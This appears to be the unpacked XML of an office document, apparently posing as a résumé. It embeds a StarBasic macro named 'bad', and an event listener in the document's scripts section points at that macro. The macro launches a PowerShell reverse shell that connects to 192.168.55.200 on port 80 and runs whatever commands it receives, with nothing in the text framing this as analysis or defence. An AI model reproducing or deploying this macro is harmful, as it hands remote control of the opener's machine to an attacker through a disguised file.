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bad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bad.Main?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts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a8f" officeooo:paragraph-rsid="001b7a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y this is my resu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4:06:52.484128836</meta:creation-date>
    <dc:date>2022-03-16T14:21:21.393490177</dc:date>
    <meta:editing-duration>PT8M4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5" meta:character-count="21" meta:non-whitespace-character-count="17"/>
  </office:meta>
</office:document-meta>
</file>

<file path=Basic/Standard/bad.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="bad" script:language="StarBasic">REM  *****  BASIC  *****

Sub Main
	Shell("$sm=(New-Object Net.Sockets.TCPClient('192.168.55.200',80)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2&gt;&amp;1));$sm.Write($st,0,$st.Length)}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